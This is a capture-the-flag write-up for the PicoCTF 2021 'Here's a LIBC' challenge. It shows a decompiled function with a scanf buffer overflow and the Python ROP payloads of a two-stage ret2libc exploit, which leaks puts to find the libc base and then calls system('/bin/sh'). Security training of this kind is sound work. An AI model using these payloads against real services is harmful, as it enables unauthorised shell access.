# PicoCTF 2021, Here's a LIBC, pwn

## Solution

Vulnerable function:
```c
void do_stuff(void)
{
    char cVar1;
    undefined local_89;
    char local_88 [0x70];
    undefined8 local_18;
    ulong local_10;
    
    local_18 = 0x0;
    __isoc99_scanf("%[^\n]",local_88);
    __isoc99_scanf(&DAT_0040093a,&local_89);
    local_10 = 0x0;
    while (local_10 < 0x64) {
        cVar1 = convert_case((int)local_88[local_10],local_10,local_10);
        local_88[local_10] = cVar1;
        local_10 = local_10 + 0x1;
    }
    puts(local_88);
    return;
}
```

We can overflow buffer local_88 and leak e.g. puts plt address, so we can calculate libc base. Binary is 64bit, so we have to move puts plt address to rdi register and call puts to print it out. After this we should call do_stuff function again.

```py
payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(DO_STUFF)
```
After executing this piece of exploit we got puts plt address. We are given exact libc version so calculating it's base address was not hard at all. 

```py
libc_base = PUTS_LEAKED - libc.symbols["puts"]
```

So now we are again in do_stuff function. Now we know libc base address, so we can calculate system() address, exit() address and look for /bin/sh string in our libc file.

Using again buffer overflow we can pop the shell:

```py
payload = b'A' * OFFSET
payload += p64(RET) # align stack
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)
```



Exploit: [go.py](./go.py)
